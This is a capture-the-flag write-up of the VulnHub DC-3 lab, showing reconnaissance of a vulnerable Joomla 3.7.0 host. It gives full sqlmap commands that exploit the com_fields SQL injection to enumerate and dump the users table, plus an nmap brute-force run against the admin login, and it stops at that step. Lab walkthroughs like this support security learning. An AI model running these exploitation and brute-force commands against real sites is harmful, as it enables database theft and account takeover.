# DC-3

## 1.Enumeration

```bash
root@kali: arp-scan -I eth0 -l

Interface: eth0, type: EN10MB, MAC: 08:00:27:b2:e9:3f, IPv4: 192.168.56.102
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1	0a:00:27:00:00:0f	(Unknown: locally administered)
192.168.56.100	08:00:27:5f:5e:41	PCS Systemtechnik GmbH
192.168.56.115	08:00:27:31:0f:a8	PCS Systemtechnik GmbH
```

The IP address is `192.168.56.115`, let's scan it.

```bash
root@kali: nmap -sC -sV -p80 -v -oN nmap.out 192.168.56.115

Nmap scan report for 192.168.56.115
Host is up (0.00044s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA
|_http-title: Home
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-generator: Joomla! - Open Source Content Management
MAC Address: 08:00:27:31:0F:A8 (Oracle VirtualBox virtual NIC)

```

The only open port is port 80, so we have to work on the web application:

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/8d992b5c-3a5d-4d38-898d-917b0ca7228d)

visiting the site, Wappalyzer shows this is a `Joomla` cms, also cheking the target with Nikto shows afew interesting directories :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/d70cfbff-32d9-4a05-b39c-3f9932602930)

so i visited the `/administrator` page :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/b467734b-1e5e-4c24-8038-4392ad61cca1)

this is actually a joomla CMS, let's find the version of it to see any exploit available

there is a tool called `joomscan` that does afew enumeration :

```bash
root@kali: joomscan --url http://192.168.56.115
```
![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/9a056c02-4bd8-43a7-9f4f-4e1fa4ec87e3)

you can also check for the version by visiting the below urls, but it gives an approximate version :

```bash
curl http://192.168.56.115/administrator/manifests/files/joomla.xml | grep version
 curl http://192.168.56.115/language/en-GB/en-GB.xml | grep version
```

then in searchsploit i found afew exploits :

```text
Joomla! 3.7 - SQL Injection | php/remote/44227.php
Joomla! 3.7.0 - 'com_fields' SQL Injection | php/webapps/42033.txt
```

the first one `44227` did not work, but the second one guides through a valid SQLi bug, i used the command mentioned in the document :

```bash
root@kali: #sqlmap -u "http://192.168.56.115/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] --batch
```

sqlmap found the database in use, `joomladb`, then i tried to dump the data out of it, but did not work since it showed an error after running the below command :

```bash
root@kali: sqlmap -u "http://192.168.56.115/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --T '#__users' --dump -p list[fullordering] --batch 
```
![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/8b690314-3d8d-4f09-bfc2-6d0a66c713df)

there must be something with the naming of the table which starts by `#`, so i went to another path and tried to brute force the admin panel

i used metasploit `auxiliary/scanner/http/joomla_bruteforce_login` but my system crushed every time i used this module, so i used nmap instead

put admin in user.txt

```bash
root@kali: nmap -v -sV --script http-joomla-brute --script-args 'userdb=/root/ctf/dc-3/user.txt,passdb=/usr/share/wordlists/rockyou.txt,http-joomla-brute.threads=3,brute.firstonly=true' 192.168.56.115
```
























